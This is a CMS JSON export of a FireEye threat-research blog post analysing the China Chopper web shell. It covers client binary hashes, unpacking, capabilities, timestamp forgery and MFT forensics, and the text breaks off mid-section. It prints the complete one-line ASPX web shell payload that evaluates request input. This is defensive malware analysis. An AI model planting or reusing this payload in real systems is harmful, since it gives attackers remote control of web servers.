{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Wed May 04 2016 09:03:57 GMT-0400",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Breaking Down the China Chopper Web Shell - Part I",
    "cq:lastReplicationAction": "Activate",
    "jcr:versionHistory": "2723f382-c50d-4473-a568-0dafe54a5b07",
    "author": "Tony Lee",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "cq:lastReplicatedBy": "lynda.hall@fireeye.com",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "5bc755d8-80f3-4af3-ab6f-c7746dee960f"
    ],
    "jcr:created": "Fri Jan 26 2018 17:29:15 GMT-0500",
    "cq:lastReplicated": "Fri Jan 26 2018 17:29:15 GMT-0500",
    "cq:lastModified": "Fri Jan 26 2018 17:29:10 GMT-0500",
    "jcr:baseVersion": "5bc755d8-80f3-4af3-ab6f-c7746dee960f",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-doctypes:blog",
      "fireeye-blog-authors:cap-ian-ahl",
      "fireeye-blog-authors:cap-tony-lee",
      "fireeye-blog-authors:cap-dennis-hanzlik",
      "fireeye-blog-threat-research:threat-research"
    ],
    "jcr:uuid": "822b7111-7777-4e06-b7e8-83ec0755abdb",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Aug 07 2013 01:00:00 GMT-0700",
    "cq:lastModifiedBy": "lynda.hall@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
        "text": "\u003Cp\u003E\u003Ci\u003EPart I in a two-part series.\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cb\u003EChina Chopper: The Little Malware That Could\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003EChina Chopper is\u0026nbsp;a slick little web shell that does not get enough exposure and credit for its stealth. Other than a \u003Ca href=\u0022http:\/\/informationonsecurity.blogspot.com\/2012\/11\/china-chopper-webshell.html\u0022\u003Egood blog post\u003C\/a\u003E from security researcher Keith Tyler, we could find little useful information on China Chopper when we ran across it during an incident response engagement. So to\u0026nbsp;contribute something new to the public knowledge base \u2014\u0026nbsp;especially for those who happen to find the China Chopper server-side payload on one of their Web servers\u0026nbsp;\u2014\u0026nbsp;we studied the components, capabilities, payload attributes, and the detection rate of this 4 kilobyte menace.\u003C\/p\u003E\n\u003Cp\u003E\u003Cb\u003EComponents\u003C\/b\u003E\u003C\/p\u003E\n\u003Cp\u003EChina Chopper is a fairly simple backdoor in terms of components. It has two key components:the Web shell command-and-control (CnC) client binary and a text-based Web shell payload (server component). The text-based payload is so simple and short that an attacker could type it by hand right on the target server \u2014\u0026nbsp;no file transfer needed.\u003C\/p\u003E\n\u003Ch2\u003EWeb Shell Client\u003C\/h2\u003E\n\u003Cp\u003EThe Web shell client used to be available on www.maicaidao.com, but we would advise against visiting that site now.\u003C\/p\u003E\n\u003Ctable class=\u0022c09 c09-zebra has-data-label has-auto-width\u0022\u003E\n\u003Ctbody\u003E\u003Ctr class=\u0022c09_tr c09_tr-th\u0022\u003E\u003Cth scope=\u0022col\u0022 class=\u0022c09_td\u0022\u003EWeb shell (CnC) Client\u003C\/th\u003E\n\u003Cth scope=\u0022col\u0022 class=\u0022c09_td\u0022\u003EMD5 Hash\u003C\/th\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd class=\u0022c09_td\u0022 data-label=\u0022Web shell (CnC) Client:\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003Ecaidao.exe\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003Ecaidao.exe\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd class=\u0022c09_td\u0022 data-label=\u0022MD5 Hash:\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E5001ef50c7e869253a7c152a638eab8a\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E5001ef50c7e869253a7c152a638eab8a\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image001.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image001.png\u0022 alt=\u0022Client binary viewed in WinHex\u0022 class=\u0022size-full wp-image-2622 landscape-lg\u0022 width=\u00221059\u0022 height=\u0022735\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 1: Client binary viewed in WinHex\u003C\/p\u003E\n\u003Cp\u003EUsing the executable file compressor UPX to unpack the binary allows us to see some of the details that were hidden by the packer.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd style=\u0022text-align: left;\u0022 width=\u0022798\u0022 valign=\u0022top\u0022\u003E\u003Cpre\u003E\nC:\\Documents and Settings\\Administrator\\Desktop\u0026gt;upx -d\n\u003Cspan style=\u0022font-family: \u0026#39;Courier 10 Pitch\u0026#39;, Courier, monospace; font-size: 13px; font-style: normal; line-height: 1.5;\u0022\u003E5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe\u003C\/span\u003E\n\u003C\/pre\u003E\n\u003Cpre\u003E\nUltimate Packer for eXecutables\n\u003C\/pre\u003E\n\u003Cpre\u003E\nCopyright (C) 1996 - 2011\nUPX 3.08w       Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser   Dec 12th 2011\nFile size         Ratio      Format      Name\n--------------------   ------   -----------   -----------\n\u003C\/pre\u003E\n\u003Cpre\u003E\n700416 \u0026lt;-    220672   31.51%    win32\/pe     decomp.exe\nUnpacked 1 file.\n\u003C\/pre\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EUsing PEiD (a free tool for detecting\u0026nbsp;packers, cryptors and compilers found in PE executable files), we see that the\u0026nbsp;unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image002.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image002.png\u0022 alt=\u0022image002\u0022 class=\u0022alignnone size-full wp-image-2624 landscape-sm\u0022 width=\u0022418\u0022 height=\u0022239\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 2: PEiD reveals that the binary was written using Visual C++ 6.0\u003C\/p\u003E\n\u003Cp\u003EBecause the strings are not encoded, examining the printable strings in the unpacked binary provides insight into how the backdoor communicates. We were intrigued to see a reference to google.com.hk using the Chinese (simplified) language parameter (Figure 3) as well as references to the text \u201cChopper\u0026quot; (Figure 4).\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image003.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image003.png\u0022 alt=\u0022image003\u0022 class=\u0022alignnone size-full wp-image-2625 landscape-med\u0022 width=\u0022664\u0022 height=\u0022331\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 3: Printable strings refer to \u003Ca href=\u0022http:\/\/www.google.com.hk\/\u0022\u003Ewww.google.com.hk\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image004.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image004.png\u0022 alt=\u0022image004\u0022 class=\u0022alignnone size-full wp-image-2626 landscape-med\u0022 width=\u0022666\u0022 height=\u0022309\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 4: References to Chopper in the client binary\u003C\/p\u003E\n\u003Cp\u003ESo we have highlighted some attributes of the client binary. But what does it look like in use? China Chopper is a menu-driven GUI full of convenient attack and victim-management features. Upon opening the client, you see example shell entries that point to www.maicaidao.com, which originally hosted components of the Web shell.\u003C\/p\u003E\n\u003Cp\u003ETo add your own target, right click within the client, select \u201cAdd\u201d and enter the target IP address, password, and encoding as shown in Figure 5.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image005.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image005.png\u0022 alt=\u0022image005\u0022 class=\u0022alignnone size-full wp-image-2627 landscape-med\u0022 width=\u0022755\u0022 height=\u0022572\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 5: Picture of the China Chopper Web shell client binary\u003C\/p\u003E\n\u003Ch2\u003EServer-side Payload Component\u003C\/h2\u003E\n\u003Cp\u003EBut the client is only half of the remote access tool \u2014\u0026nbsp;and not likely the part you would find on your network. Its communication relies on a payload in the form of a small Web application. This payload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Some of the original files that were available for download are shown with their MD5 hashes:\u003C\/p\u003E\n\u003Ctable class=\u0022c09 c09-zebra has-data-label has-auto-width\u0022\u003E\n\u003Ctbody\u003E\u003Ctr class=\u0022c09_tr c09_tr-th\u0022\u003E\u003Cth class=\u0022c09_td\u0022 scope=\u0022col\u0022\u003EWeb shell Payload\u003C\/th\u003E\n\u003Cth class=\u0022c09_td\u0022 scope=\u0022col\u0022\u003EMD5 Hash\u003C\/th\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Web shell Payload:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003ECustomize.aspx\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003ECustomize.aspx\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022MD5 Hash:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E8aa603ee2454da64f4c70f24cc0b5e08\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E8aa603ee2454da64f4c70f24cc0b5e08\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Web shell Payload:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003ECustomize.cfm\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003ECustomize.cfm\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022MD5 Hash:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003Ead8288227240477a95fb023551773c84\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003Ead8288227240477a95fb023551773c84\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Web shell Payload:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003ECustomize.jsp\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003ECustomize.jsp\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022MD5 Hash:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003Eacba8115d027529763ea5c7ed6621499\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003Eacba8115d027529763ea5c7ed6621499\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ESource:\u0026nbsp; \u003Ca href=\u0022http:\/\/informationonsecurity.blogspot.com\/2012\/11\/china-chopper-webshell.html\u0022\u003Ehttp:\/\/informationonsecurity.blogspot.com\/2012\/11\/china-chopper-webshell.html\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EEven though the MD5s are useful, keep in mind that this is a text-based payload that can be easily changed, resulting in a new MD5 hash. We will discuss the payload attributes later, but here is an example of just one of the text-based payloads:\u003C\/p\u003E\n\u003Cp\u003E\u003Cb\u003EASPX:\u003C\/b\u003E\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022798\u0022 valign=\u0022top\u0022\u003E\u003Cb\u003E\u0026nbsp;\u003C\/b\u003E\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%\u0026gt;\u0026lt;%eval(Request.Item[\u0026quot;password\u0026quot;],\u0026quot;unsafe\u0026quot;);%\u0026gt;\u003Cb\u003E\u003C\/b\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ENote that \u201cpassword\u201d would be replaced with the actual password to be used in the client component when connecting to the Web shell.\u003C\/p\u003E\n\u003Cp\u003EIn the next post, we provide regular expressions that can be used to find instances of this Web shell.\u003C\/p\u003E\n\u003Ch2\u003ECapabilities\u003C\/h2\u003E\n\u003Cp\u003EThe capabilities of both the payload and the client are impressive considering their size.\u0026nbsp; The Web shell client contains a \u201cSecurity Scan\u201d feature, independent of the payload, which gives the attacker the ability to spider and use brute force password guessing against authentication portals.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image006.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image006.png\u0022 alt=\u0022image006\u0022 class=\u0022alignnone size-full wp-image-2628 landscape-lg\u0022 width=\u00221022\u0022 height=\u0022315\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 6: China Chopper provides a \u201cSecurity Scan\u201d feature\u003C\/p\u003E\n\u003Cp\u003EIn addition to vulnerability hunting, this Web shell has excellent CnC features when combining the client and payload, include the following:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EFile Management (File explorer)\u003C\/li\u003E\n\u003Cli\u003EDatabase Management (DB client)\u003C\/li\u003E\n\u003Cli\u003EVirtual Terminal (Command shell)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EIn China Chopper\u0026#39;s main window, right-clicking one of the target URLs brings up a list of possible actions (see Figure 7).\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image007.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image007.png\u0022 alt=\u0022image007\u0022 class=\u0022alignnone size-full wp-image-2629 landscape-lg\u0022 width=\u0022856\u0022 height=\u0022350\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 7: Screenshot of the CnC client showing capabilities of the Web shell\u003C\/p\u003E\n\u003Ch3\u003EFile Management\u003C\/h3\u003E\n\u003Cp\u003EUsed as a remote access tool (RAT), China Chopper makes file management simple.\u0026nbsp; Abilities include uploading and downloading files to and from the victim, using the file-retrieval tool wget to download files from the Web to the target, editing, deleting, copying, renaming, and even changing the timestamp of the files.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image008.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image008.png\u0022 alt=\u0022image008\u0022 class=\u0022alignnone size-full wp-image-2630 landscape-lg\u0022 width=\u0022857\u0022 height=\u0022408\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 8: File Management provides an easy to use menu that is activated by right-clicking on a file name\u003C\/p\u003E\n\u003Cp\u003ESo just how stealthy is the \u201cModify the file time\u201d option? Figure 9 shows the timestamps of the three files in the test directory before the Web shell modifies the timestamps. By default, Windows Explorer shows only the \u201cDate Modified\u201d field. So normally, our Web shell easily stands out because it is newer than the other two files.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image009.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image009.png\u0022 alt=\u0022image009\u0022 class=\u0022alignnone size-full wp-image-2631 landscape-lg\u0022 width=\u0022821\u0022 height=\u0022205\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 9: IIS directory showing time stamps prior to the time modification\u003C\/p\u003E\n\u003Cp\u003EFigure 10 shows the date of the file after the Web shell modifies the timestamp. The modified time on our Web shell shows up as the same as the other two files. Because this is the default field displayed to users, it easily blends in to the untrained eye \u2014\u0026nbsp;especially with many files in the directory.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image010.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image010.png\u0022 alt=\u0022image010\u0022 class=\u0022alignnone size-full wp-image-2632 landscape-lg\u0022 width=\u0022819\u0022 height=\u0022205\u0022\u003E\u003C\/a\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 10: IIS directory showing time stamps after the time modification\u003C\/p\u003E\n\u003Cp\u003EClever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date. But this is not necessarily anomalous. Additionally, even if the file is detected, the forensic timeline would be skewed because the date that the attacker planted the file is no longer present. To find the real date the file was planted, you need to go to the Master File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, we recommend using mftdump (available from \u003Ca href=\u0022http:\/\/malware-hunters.net\/all-downloads\/\u0022\u003Ehttp:\/\/malware-hunters.net\/all-downloads\/\u003C\/a\u003E). Written by FireEye researcher Mike Spohn, mftdump\u0026nbsp;is a great tool for extracting and analyzing file metadata.\u003C\/p\u003E\n\u003Cp\u003EThe following table shows the timestamps pulled from the MFT for our Web shell file. We pulled the timestamps before and after the timestamps were modified. Notice that the \u201cfn*\u201d fields retain their original times, thus all is not lost for the investigator!\u003C\/p\u003E\n\u003Ctable class=\u0022c09 c09-zebra has-data-label\u0022\u003E\n\u003Ctbody\u003E\u003Ctr class=\u0022c09_tr c09_tr-th\u0022\u003E\u003Cth class=\u0022c09_td\u0022 scope=\u0022col\u0022\u003ECategory\u003C\/th\u003E\n\u003Cth class=\u0022c09_td\u0022 scope=\u0022col\u0022\u003EPre-touch match\u003C\/th\u003E\n\u003Cth class=\u0022c09_td\u0022 scope=\u0022col\u0022\u003EPost-touch match\u003C\/th\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EsiCreateTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EsiCreateTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E2\/21\/2003 22:48\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E2\/21\/2003 22:48\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EsiAccessTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EsiAccessTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/20\/2013 1:41\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/20\/2013 1:41\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/25\/2013 18:56\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/25\/2013 18:56\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EsiModTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EsiModTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/7\/2013 0:33\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/7\/2013 0:33\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E2\/21\/2003 22:48\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E2\/21\/2003 22:48\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EsiMFTModTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EsiMFTModTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/20\/2013 1:54\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/20\/2013 1:54\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/25\/2013 18:56\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/25\/2013 18:56\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EfnCreateTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EfnCreateTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:01\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EfnAccessTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EfnAccessTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:03\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:03\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:03\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:03\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EfnModTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EfnModTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/4\/2013 15:42\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/4\/2013 15:42\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/4\/2013 15:42\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/4\/2013 15:42\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr class=\u0022c09_tr\u0022\u003E\u003Ctd data-label=\u0022Category:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003EfnMFTModTime (UTC)\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003EfnMFTModTime (UTC)\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Pre-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:04\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:04\u003C\/span\u003E\u003C\/td\u003E\n\u003Ctd data-label=\u0022Post-touch match:\u0022 class=\u0022c09_td\u0022\u003E\u003Cspan class=\u0022is-visible-mml\u0022\u003E \u003Cspan\u003E6\/6\/2013 16:04\u003C\/span\u003E\u003C\/span\u003E \u003Cspan class=\u0022c09_td_value is-hidden-mml\u0022\u003E6\/6\/2013 16:04\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch3\u003EDatabase Management\u003C\/h3\u003E\n\u003Cp\u003EThe Database Management functionality is impressive and helpful to the first-time user.\u0026nbsp; Upon configuring the client, China Chopper provides example connection syntax.\u003C\/p\u003E\n\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image011.png\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image011.png\u0022 